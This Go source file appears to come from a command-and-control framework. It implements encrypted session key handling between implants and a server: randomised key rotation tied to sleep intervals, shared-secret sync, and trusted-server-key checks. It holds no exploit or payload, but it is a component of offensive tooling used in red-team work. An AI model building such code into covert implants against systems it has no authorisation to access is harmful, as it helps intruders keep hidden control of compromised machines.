//go:build !nokeyset
// +build !nokeyset

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

func (s *Session) keyCheckRevert() {
	if s.keysNext = nil; bugtrack.Enabled {
		bugtrack.Track("c2.(*Session).keyCheckRevert(): %s KeyPair queued sync canceled!", s.ID)
	}
}
func (s *Session) keyCheckSync() error {
	if s.keysNext == nil {
		return nil
	}
	if cout.Enabled {
		s.log.Debug("[%s/Crypt] Syncing KeyPair shared secret.", s.ID)
	}
	v := s.keysNext
	s.keysNext = nil
	if err := s.keys.FillPrivate(v.Private); err != nil {
		if cout.Enabled {
			s.log.Error("[%s/Crypt] KeyPair shared secret sync failed: %s!", s.ID, err)
		}
		return err
	}
	if v = nil; bugtrack.Enabled {
		bugtrack.Track("c2.(*Session).keyNextSync(): %s KeyPair shared secret sync completed! [Public: %s, Shared: %v]", s.ID, s.keys.Public, s.keys.Shared())
	}
	if cout.Enabled {
		s.log.Trace("[%s/Crypt] KeyPair shared secret sync completed!", s.ID)
	}
	return nil
}
func (s *Session) keyNextSync() *com.Packet {
	if !s.IsClient() || s.keysNext != nil || s.state.Moving() {
		return nil
	}
	// Have the % chance of changing be a factor of how LONG we sleep for, so
	// implants that wait a longer period of time won't necessarily change keys
	// less than ones that update in shorter periods.
	d := 60 - int(s.sleep/time.Minute)
	if d < 0 {
		d = 0 // Base will ALWAYS be 50.
	}
	if util.FastRandN(50+d) != 0 {
		return nil
	}
	if cout.Enabled {
		s.log.Info("[%s/Crypt] Generating new public/private KeyPair for sync.", s.ID)
	}
	var (
		n = &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
		v data.KeyPair
	)
	v.Fill()
	v.Write(n)
	if s.keysNext = &v; bugtrack.Enabled {
		bugtrack.Track("c2.(*Session).keyNextSync(): %s KeyPair details queued for next sync. [Public: %s]", s.ID, v.Public)
	}
	return n
}
func (s *Session) keySessionGenerate(n *com.Packet) {
	s.keys.Fill()
	s.keys.Write(n)
	if n.Flags |= com.FlagCrypt; cout.Enabled {
		s.log.Debug("[%s/Crypt] Generated KeyPair details!", s.ID)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.(*Session).keySessionGenerate(): %s KeyPair generated! [Public: %s]", s.ID, s.keys.Public)
	}
}
func (s *Session) keySessionSync(n *com.Packet) error {
	if s.keys.IsSynced() {
		if cout.Enabled {
			s.log.Warning(`[%s/Crypt] Packet "%s" has un-matched KeyPair data, did the server change?`, s.ID)
		}
		return nil
	}
	if err := s.keys.Read(n); err != nil {
		if cout.Enabled {
			s.log.Error(`[%s/Crypt] KeyPair read failed: %s!`, s.ID, err)
		}
		return err
	}
	// Check server PublicKey here if we have any TrustedKeys set in our profile.
	if s.p != nil && !s.p.TrustedKey(s.keys.Public) {
		if cout.Enabled {
			s.log.Error(`[%s/Crypt] Server PublicKey "%s" is NOT in our Trusted Keys list!`, s.ID, s.keys.Public)
		}
		return xerr.Sub("non-trusted server PublicKey", 0x79)
	}
	if err := s.keys.Sync(); err != nil {
		if cout.Enabled {
			s.log.Error(`[%s/Crypt] KeyPair sync failed: %s!`, s.ID, err)
		}
		return err
	}
	if cout.Enabled {
		s.log.Debug(`[%s/Crypt] KeyPair sync with server "%s" completed!`, s.ID, s.keys.Public)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.(*Session).keySessionSync(): %s KeyPair synced! [Public: %s, Shared: %v]", s.ID, s.keys.Public, s.keys.Shared())
	}
	return nil
}
